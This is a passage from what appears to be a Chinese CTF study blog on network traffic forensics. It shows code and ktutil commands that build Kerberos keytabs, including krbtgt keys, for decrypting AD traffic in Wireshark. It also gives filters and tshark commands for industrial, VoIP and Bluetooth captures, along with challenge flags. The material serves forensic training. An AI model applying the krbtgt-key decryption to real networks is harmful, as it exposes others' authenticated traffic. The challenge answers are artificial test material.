class="hljs-variable">$File</span>) + <span class="hljs-variable">$keyTabEntries</span><br>    [<span class="hljs-type">System.IO.File</span>]::WriteAllBytes(<span class="hljs-variable">$File</span>,<span class="hljs-variable">$fileBytes</span>)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$fileBytes</span> = <span class="hljs-selector-tag">@</span>()<br>    <span class="hljs-variable">$fileBytes</span> += <span class="hljs-variable">$keyTabVersion</span><br>    <span class="hljs-variable">$fileBytes</span> += <span class="hljs-variable">$keyTabEntries</span><br>    [<span class="hljs-type">System.IO.File</span>]::WriteAllBytes(<span class="hljs-variable">$File</span>,<span class="hljs-variable">$fileBytes</span>)<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$fileBytes</span> = <span class="hljs-selector-tag">@</span>()<br><span class="hljs-variable">$fileBytes</span> += <span class="hljs-variable">$keyTabVersion</span><br><span class="hljs-variable">$fileBytes</span> += <span class="hljs-variable">$keyTabEntries</span><br>[<span class="hljs-type">System.IO.File</span>]::WriteAllBytes(<span class="hljs-variable">$File</span>,<span class="hljs-variable">$fileBytes</span>)<br>&#125;<br></code></pre></td></tr></table></figure>

<p>方法二：基于impacket生成 keytab</p>
<p>参考文章：</p>
<ol>
<li><p><a target="_blank" rel="noopener" href="https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7">https://medium.com/tenable-techblog/decrypt-encrypted-stub-data-in-wireshark-deb132c076e7</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#debugging-kerberos-the-easy-way">https://dirkjanm.io/active-directory-forest-trusts-part-two-trust-transitivity/#debugging-kerberos-the-easy-way</a></p>
</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> unpack, pack<br><span class="hljs-keyword">from</span> impacket.structure <span class="hljs-keyword">import</span> Structure<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># Keytab structure from http://www.ioplex.com/utilities/keytab.txt</span><br>  <span class="hljs-comment"># keytab &#123;</span><br>  <span class="hljs-comment">#     uint16_t file_format_version;                    /* 0x502 */</span><br>  <span class="hljs-comment">#     keytab_entry entries[*];</span><br>  <span class="hljs-comment"># &#125;;</span><br><br>  <span class="hljs-comment"># keytab_entry &#123;</span><br>  <span class="hljs-comment">#     int32_t size;</span><br>  <span class="hljs-comment">#     uint16_t num_components;    /* sub 1 if version 0x501 */</span><br>  <span class="hljs-comment">#     counted_octet_string realm;</span><br>  <span class="hljs-comment">#     counted_octet_string components[num_components];</span><br>  <span class="hljs-comment">#     uint32_t name_type;   /* not present if version 0x501 */</span><br>  <span class="hljs-comment">#     uint32_t timestamp;</span><br>  <span class="hljs-comment">#     uint8_t vno8;</span><br>  <span class="hljs-comment">#     keyblock key;</span><br>  <span class="hljs-comment">#     uint32_t vno; /* only present if &gt;= 4 bytes left in entry */</span><br>  <span class="hljs-comment"># &#125;;</span><br><br>  <span class="hljs-comment"># counted_octet_string &#123;</span><br>  <span class="hljs-comment">#     uint16_t length;</span><br>  <span class="hljs-comment">#     uint8_t data[length];</span><br>  <span class="hljs-comment"># &#125;;</span><br><br>  <span class="hljs-comment"># keyblock &#123;</span><br>  <span class="hljs-comment">#     uint16_t type;</span><br>  <span class="hljs-comment">#     counted_octet_string;</span><br>  <span class="hljs-comment"># &#125;;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KeyTab</span>(<span class="hljs-title class_ inherited__">Structure</span>):<br>    structure = (<br>        (<span class="hljs-string">&#x27;file_format_version&#x27;</span>,<span class="hljs-string">&#x27;H=517&#x27;</span>),<br>        (<span class="hljs-string">&#x27;keytab_entry&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>)<br>    )<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fromString</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-variable language_">self</span>.entries = []<br>        Structure.fromString(<span class="hljs-variable language_">self</span>, data)<br>        data = <span class="hljs-variable language_">self</span>[<span class="hljs-string">&#x27;keytab_entry&#x27;</span>]<br>        <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(data) != <span class="hljs-number">0</span>:<br>            ktentry = KeyTabEntry(data)<br><br>            data = data[<span class="hljs-built_in">len</span>(ktentry.getData()):]<br>            <span class="hljs-variable language_">self</span>.entries.append(ktentry)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getData</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>[<span class="hljs-string">&#x27;keytab_entry&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span>.join([entry.getData() <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.entries])<br>        data = Structure.getData(<span class="hljs-variable language_">self</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">OctetString</span>(<span class="hljs-title class_ inherited__">Structure</span>):<br>    structure = (<br>        (<span class="hljs-string">&#x27;len&#x27;</span>, <span class="hljs-string">&#x27;&gt;H-value&#x27;</span>),<br>        (<span class="hljs-string">&#x27;value&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>)<br>    )<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KeyTabContentRest</span>(<span class="hljs-title class_ inherited__">Structure</span>):<br>    structure = (<br>        (<span class="hljs-string">&#x27;name_type&#x27;</span>, <span class="hljs-string">&#x27;&gt;I=1&#x27;</span>),<br>        (<span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;&gt;I=0&#x27;</span>),<br>        (<span class="hljs-string">&#x27;vno8&#x27;</span>, <span class="hljs-string">&#x27;B=2&#x27;</span>),<br>        (<span class="hljs-string">&#x27;keytype&#x27;</span>, <span class="hljs-string">&#x27;&gt;H&#x27;</span>),<br>        (<span class="hljs-string">&#x27;keylen&#x27;</span>, <span class="hljs-string">&#x27;&gt;H-key&#x27;</span>),<br>        (<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>)<br>    )<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KeyTabContent</span>(<span class="hljs-title class_ inherited__">Structure</span>):<br>    structure = (<br>        (<span class="hljs-string">&#x27;num_components&#x27;</span>, <span class="hljs-string">&#x27;&gt;h&#x27;</span>),<br>        (<span class="hljs-string">&#x27;realmlen&#x27;</span>, <span class="hljs-string">&#x27;&gt;h-realm&#x27;</span>),<br>        (<span class="hljs-string">&#x27;realm&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>),<br>        (<span class="hljs-string">&#x27;components&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>),<br>        (<span class="hljs-string">&#x27;restdata&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>)<br>    )<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">fromString</span>(<span class="hljs-params">self, data</span>):<br>        <span class="hljs-variable language_">self</span>.components = []<br>        Structure.fromString(<span class="hljs-variable language_">self</span>, data)<br>        data = <span class="hljs-variable language_">self</span>[<span class="hljs-string">&#x27;components&#x27;</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-variable language_">self</span>[<span class="hljs-string">&#x27;num_components&#x27;</span>]):<br>            ktentry = OctetString(data)<br><br>            data = data[ktentry[<span class="hljs-string">&#x27;len&#x27;</span>]+<span class="hljs-number">2</span>:]<br>            <span class="hljs-variable language_">self</span>.components.append(ktentry)<br>        <span class="hljs-variable language_">self</span>.restfields = KeyTabContentRest(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getData</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>[<span class="hljs-string">&#x27;num_components&#x27;</span>] = <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.components)<br>        <span class="hljs-comment"># We modify the data field to be able to use the</span><br>        <span class="hljs-comment"># parent class parsing</span><br>        <span class="hljs-variable language_">self</span>[<span class="hljs-string">&#x27;components&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span>.join([component.getData() <span class="hljs-keyword">for</span> component <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.components])<br>        <span class="hljs-variable language_">self</span>[<span class="hljs-string">&#x27;restdata&#x27;</span>] = <span class="hljs-variable language_">self</span>.restfields.getData()<br>        data = Structure.getData(<span class="hljs-variable language_">self</span>)<br>        <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">KeyTabEntry</span>(<span class="hljs-title class_ inherited__">Structure</span>):<br>    structure = (<br>        (<span class="hljs-string">&#x27;size&#x27;</span>,<span class="hljs-string">&#x27;&gt;I-content&#x27;</span>),<br>        (<span class="hljs-string">&#x27;content&#x27;</span>,<span class="hljs-string">&#x27;:&#x27;</span>, KeyTabContent)<br>    )<br><br><span class="hljs-comment"># Add your own keys here!</span><br><span class="hljs-comment"># Keys are tuples in the form (keytype, &#x27;hexencodedkey&#x27;)</span><br><span class="hljs-comment"># Common keytypes for Windows:</span><br><span class="hljs-comment"># 23: RC4</span><br><span class="hljs-comment"># 18: AES-256</span><br><span class="hljs-comment"># 17: AES-128</span><br><span class="hljs-comment"># Wireshark takes any number of keys in the keytab, so feel free to add</span><br><span class="hljs-comment"># krbtgt keys, service keys, trust keys etc</span><br>keys = [<br>    (<span class="hljs-number">23</span>, <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),<br>    (<span class="hljs-number">18</span>, <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),<br>    (<span class="hljs-number">17</span>, <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),<br>    (<span class="hljs-number">18</span>, <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>),<br>    (<span class="hljs-number">23</span>, <span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>]<br><br>nkt = KeyTab()<br>nkt.entries = []<br><br><span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:<br>    ktcr = KeyTabContentRest()<br>    ktcr[<span class="hljs-string">&#x27;keytype&#x27;</span>] = key[<span class="hljs-number">0</span>]<br>    ktcr[<span class="hljs-string">&#x27;key&#x27;</span>] = binascii.unhexlify(key[<span class="hljs-number">1</span>])<br>    nktcontent = KeyTabContent()<br>    nktcontent.restfields = ktcr<br>    <span class="hljs-comment"># The realm here doesn&#x27;t matter for wireshark but does of course for a real keytab</span><br>    nktcontent[<span class="hljs-string">&#x27;realm&#x27;</span>] = <span class="hljs-string">b&#x27;TESTSEGMENT.LOCAL&#x27;</span><br>    krbtgt = OctetString()<br>    krbtgt[<span class="hljs-string">&#x27;value&#x27;</span>] = <span class="hljs-string">&#x27;krbtgt&#x27;</span><br>    nktcontent.components = [krbtgt]<br>    nktentry = KeyTabEntry()<br>    nktentry[<span class="hljs-string">&#x27;content&#x27;</span>] = nktcontent<br>    nkt.entries.append(nktentry)<br><br>data = nkt.getData()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Usage: keytab.py &lt;outputfile&gt;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Keys should be written to the source manually&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> outfile:<br>        outfile.write(data)<br></code></pre></td></tr></table></figure>

<p>方法三：在 Linux 下使用 ktutil 命令制作 keytab</p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://tipi-hack.github.io/2023/01/22/insomnihack-teaser-autopsy.html#the-dcerpc-decryption-problem">https://tipi-hack.github.io/2023/01/22/insomnihack-teaser-autopsy.html#the-dcerpc-decryption-problem</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ktutil<br>ktutil:  addent -p adm-drp@inscorp.com -k 1 -key -e rc4-hmac<br>Key <span class="hljs-keyword">for</span> adm-drp@inscorp.com (hex): 5c4dbe6a8a44446f8d2899ff08ea14f2<br>ktutil:  wkt ins.keytab<br>ktutil:  q<br></code></pre></td></tr></table></figure>

<p>例题1-<a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/02298dd/">2025 华为杯中国研究生网络安全创新大赛实网对抗赛 EZ_ATEXEC</a></p>
<p>例题2-<a target="_blank" rel="noopener" href="https://1cepeak.cn/posts/yqds2024-writeup/#ez_ad">2024 中央企业网络安全大赛 EZ_AD</a></p>
<p>例题3-<a target="_blank" rel="noopener" href="https://z3n1th1.com/2025/01/suctf2025-writeup/#su_ad">2024 SUCTF SU_AD</a></p>
<h2 id="AD域流量分析"><a href="#AD域流量分析" class="headerlink" title="AD域流量分析"></a>AD域流量分析</h2><h3 id="DCE-RPC-协议"><a href="#DCE-RPC-协议" class="headerlink" title="DCE&#x2F;RPC 协议"></a>DCE&#x2F;RPC 协议</h3><p>按照 NTLM&#x2F;Kerberos 解密的流程，解密出来后查看即可，就是这里要注意 wireshark 版本要在 4.0.6 以上，要不然会解码不完整</p>
<p><img src="/imgs/image-20251105145452260.png" srcset="/img/loading.gif" lazyload></p>
<p>然后可以依次到 TaskSchedulerService 的数据包中把完整的数据复制出来</p>
<p><img src="/imgs/image-20251105145456622.png" srcset="/img/loading.gif" lazyload></p>
<p>例题1-<a target="_blank" rel="noopener" href="https://goodlunatic.github.io/posts/02298dd/">2025 华为杯中国研究生网络安全创新大赛实网对抗赛 EZ_ATEXEC</a></p>
<p>例题2-<a target="_blank" rel="noopener" href="https://1cepeak.cn/posts/yqds2024-writeup/#ez_ad">2024 中央企业网络安全大赛 EZ_AD</a></p>
<p>例题3-<a target="_blank" rel="noopener" href="https://z3n1th1.com/2025/01/suctf2025-writeup/#su_ad">2024 SUCTF SU_AD</a></p>
<h2 id="RTP流量分析"><a href="#RTP流量分析" class="headerlink" title="RTP流量分析"></a>RTP流量分析</h2><p>RTP 协议一般用于电话流量当中，可以根据流量中传输数据的特征来判断</p>
<p><img src="/imgs/image-20251105143329850.png" srcset="/img/loading.gif" lazyload></p>
<p>我们需要先在启用的协议里勾选RTP-UDP，然后右键Decode As，改成RTP</p>
<p>然后到 电话-RTP-RTP流 中去听电话传输的内容即可，如果传的流比较多，可以用 <a target="_blank" rel="noopener" href="https://github.com/foreni-packages/rtpbreak">rtpbreak</a> 批量提取出来</p>
<p>例题1-BUUOJ VOIP</p>
<p>例题2-2025 SUCTF EZ_VOIP</p>
<p>例题3-2025 强网杯 谍影重重6.0</p>
<h2 id="工控流量分析"><a href="#工控流量分析" class="headerlink" title="工控流量分析"></a>工控流量分析</h2><p>参考连接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/song123sh/article/details/128387982">https://blog.csdn.net/song123sh/article/details/128387982</a></p>
<p>将流量按长度降序排列，然后在各层寻找线索，</p>
<p>显示分组字节，从base64后开始，然后解码看文件类型，最后显示成该类型</p>
<h3 id="Modbus-协议分析"><a href="#Modbus-协议分析" class="headerlink" title="Modbus 协议分析"></a>Modbus 协议分析</h3><p>Modbus 流量主要有三类：Modbus&#x2F;RTU、Modbus&#x2F;ASCII、Modbus&#x2F;TCP</p>
<p><strong>Modbus&#x2F;RTU</strong></p>
<blockquote>
<p>从机地址1B+功能码1B+数据字段xB+CRC值2B<br>最大长度256B，所以数据字段最大长度252B</p>
</blockquote>
<p><strong>Modbus&#x2F;ASCII</strong></p>
<blockquote>
<p>由Modbus&#x2F;RTU衍生，采用0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍<br>开始标记:（0x3A）1B+从机地址2B+功能码2B+数据字段xB+LRC值2B+结束标记\r\n2B<br>最大长度513B，因为数据字段在RTU中是最大252B，所以在ASCII中最大504B</p>
</blockquote>
<p><strong>Modbus&#x2F;TCP</strong></p>
<blockquote>
<p>不再需要从机地址，改用UnitID；不再需要CRC&#x2F;LRC，因为TCP自带校验<br>传输标识符2B+协议标识符2B+长度2B+从机ID 1B+功能码1B+数据字段xB</p>
</blockquote>
<p>一般题目考察 Modbus&#x2F;TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分）<br>因此解题的时候配合过滤器一个个功能码看过去就行</p>
<blockquote>
<p>1：读线圈<br>2：读离散输入<br>3：读保持<br>4：读输入<br>5：写单个线圈<br>6：写单个保持<br>15：写多个线圈<br>16：写多个保持</p>
</blockquote>
<h4 id="例题1-HNGK-Modbus流量分析"><a href="#例题1-HNGK-Modbus流量分析" class="headerlink" title="例题1 HNGK-Modbus流量分析"></a>例题1 HNGK-Modbus流量分析</h4><p>使用下面这个过滤器命令即可得到 flag</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(((<span class="hljs-name">_ws</span>.col.protocol == <span class="hljs-string">&quot;Modbus/TCP&quot;</span>) ) <span class="hljs-symbol">&amp;&amp;</span> (<span class="hljs-name">modbus</span>.byte_cnt)) &amp;&amp; (<span class="hljs-name">modbus</span>.func_code == <span class="hljs-number">16</span>)<br></code></pre></td></tr></table></figure>
<p><img src="/imgs/image-20240430142133329.png" srcset="/img/loading.gif" lazyload><br>flag{TheModbusProtocolIsFunny!}</p>
<h3 id="S7comm-协议分析"><a href="#S7comm-协议分析" class="headerlink" title="S7comm 协议分析"></a>S7comm 协议分析</h3><blockquote>
<p>西门子设备的工控协议，基于 COTP 实现，是COTP的上层协议</p>
<p>主要有三种类型：Job(1)、Ack_Data(3)&#x2F;Ack(2)、Userdata(7)</p>
<p>Job：下发任务&#x2F;指令</p>
<p>Ack_Data：带有返回数据</p>
<p>Ack：单纯确认，含有数据</p>
<p>Userdata：用户自定义数据区，也包含功能指令</p>
</blockquote>
<h4 id="例题1-2020ICSC湖州站—工控协议数据分析"><a href="#例题1-2020ICSC湖州站—工控协议数据分析" class="headerlink" title="例题1 2020ICSC湖州站—工控协议数据分析"></a>例题1 2020ICSC湖州站—工控协议数据分析</h4><p>首先过滤出S7协议的数据包，发现在一些Ack_Data的数据包中传输了二进制数据<br><img src="/imgs/image-20240430111822297.png" srcset="/img/loading.gif" lazyload><br>因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些Job的数据包中也有二进制数据<br><img src="/imgs/image-20240430112312109.png" srcset="/img/loading.gif" lazyload><br>然后我们尝试将所有带有二进制数据的Job数据包都过滤出来并导出特定分组，过滤器代码如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">((s7comm) &amp;&amp; (s7comm.resp.data)) &amp;&amp; (s7comm.param.func == 0x05)<br></code></pre></td></tr></table></figure>

<p><img src="/imgs/image-20240430112740044.png" srcset="/img/loading.gif" lazyload></p>
<p>然后使用 tshark 提取数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tshark">tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq<br></code></pre></td></tr></table></figure>
<p><img src="/imgs/image-20240430112936680.png" srcset="/img/loading.gif" lazyload></p>
<p>最后 CyberChef 解码二进制即可得到 flag<br><img src="/imgs/image-20240430113016466.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="例题2-2020ICSC济南站—被篡改的数据"><a href="#例题2-2020ICSC济南站—被篡改的数据" class="headerlink" title="例题2 2020ICSC济南站—被篡改的数据"></a>例题2 2020ICSC济南站—被篡改的数据</h4><p>翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据<br>使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包<br>发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤<br>因此我们使用下面这个过滤命令进行过滤，然后导出特定分组</p>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">(((<span class="hljs-name">frame</span>.number &gt;= <span class="hljs-number">19987</span> <span class="hljs-symbol">&amp;&amp;</span> frame.number &lt;=20032) <span class="hljs-symbol">&amp;&amp;</span> (<span class="hljs-name">_ws</span>.col.protocol == <span class="hljs-string">&quot;S7COMM&quot;</span>)) <span class="hljs-symbol">&amp;&amp;</span> (<span class="hljs-name">s7comm</span>.param.func == <span class="hljs-number">0</span>x05)) &amp;&amp; (<span class="hljs-name">s7comm</span>.resp.data)<br></code></pre></td></tr></table></figure>
<p>最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}</p>
<h4 id="例题3-枢网智盾2021—异常流分析"><a href="#例题3-枢网智盾2021—异常流分析" class="headerlink" title="例题3 枢网智盾2021—异常流分析"></a>例题3 枢网智盾2021—异常流分析</h4><p>打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量<br>然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">((_ws<span class="hljs-selector-class">.col</span><span class="hljs-selector-class">.protocol</span> == <span class="hljs-string">&quot;S7COMM&quot;</span>) &amp;&amp; (s7comm<span class="hljs-selector-class">.param</span><span class="hljs-selector-class">.func</span> == <span class="hljs-number">0</span>x05)) &amp;&amp; (s7comm<span class="hljs-selector-class">.resp</span><span class="hljs-selector-class">.data</span><span class="hljs-selector-attr">[0:2]</span> != ff:ff)<br></code></pre></td></tr></table></figure>
<p>即可得到 flag：flag{ffad28a0ce69db34751f}</p>
<h4 id="例题4-枢网智盾2021—工控协议分析"><a href="#例题4-枢网智盾2021—工控协议分析" class="headerlink" title="例题4 枢网智盾2021—工控协议分析"></a>例题4 枢网智盾2021—工控协议分析</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">(_ws<span class="hljs-selector-class">.col</span><span class="hljs-selector-class">.protocol</span> == <span class="hljs-string">&quot;S7COMM&quot;</span>) &amp;&amp; (frame<span class="hljs-selector-class">.number</span> == <span class="hljs-number">418</span>)<br></code></pre></td></tr></table></figure>
<p><img src="/imgs/image-20240430135813366.png" srcset="/img/loading.gif" lazyload><br>然后直接把明文传输的数据 base64 解码即可<br><img src="/imgs/image-20240430135958048.png" srcset="/img/loading.gif" lazyload></p>
<p><code>flag&#123;hncome66!&#125;</code></p>
<h3 id="IEC60870-ASDU协议"><a href="#IEC60870-ASDU协议" class="headerlink" title="IEC60870_ASDU协议"></a>IEC60870_ASDU协议</h3><blockquote>
<p>IEC60870_ASDU协议是电力系统中的一种协议</p>
</blockquote>
<p>可能会把关键信息藏在 IOA 参数中</p>
<h3 id="TPKT协议"><a href="#TPKT协议" class="headerlink" title="TPKT协议"></a>TPKT协议</h3><p>用以下命令提取下 TPKT 协议中传输的数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r S7Vegenere.pcapng -Y <span class="hljs-string">&#x27;_ws.col.protocol == &quot;TPKT&quot;&#x27;</span> -T fields -e <span class="hljs-string">&#x27;data.data&#x27;</span><br></code></pre></td></tr></table></figure>

<p>如果上面这个命令提取出来的数据不完整，可以用以下这个命令直接去提取 TCP 中传输的数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r 工业控制协议流量分析2.pcap -T fields -Y <span class="hljs-string">&#x27;!(tcp.payload == 4d:4d:53:5f:50:41:59:4c:4f:41:44:5f:4e:4f:52:4d:41:4c)&#x27;</span> -e tcp.payload &gt; out.txt<br></code></pre></td></tr></table></figure>


<h3 id="DNP-3-0协议"><a href="#DNP-3-0协议" class="headerlink" title="DNP 3.0协议"></a>DNP 3.0协议</h3><p>用以下命令提取一下传输的数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r dnp3.pcapng -T fields -e <span class="hljs-string">&#x27;dnp3.al.octet_string&#x27;</span><br></code></pre></td></tr></table></figure>


<h2 id="蓝牙流量分析"><a href="#蓝牙流量分析" class="headerlink" title="蓝牙流量分析"></a>蓝牙流量分析</h2><h3 id="OBEX协议"><a href="#OBEX协议" class="headerlink" title="OBEX协议"></a>OBEX协议</h3><p>过滤器中输入<code>OBEX</code>，然后导出传输的压缩包，然后再在搜索中输入<code>PIN Code</code>选择分组列表和字符串即可找到解压密码</p>
<h3 id="ATT协议"><a href="#ATT协议" class="headerlink" title="ATT协议"></a>ATT协议</h3><p>例题1-low_energy_crypto</p>
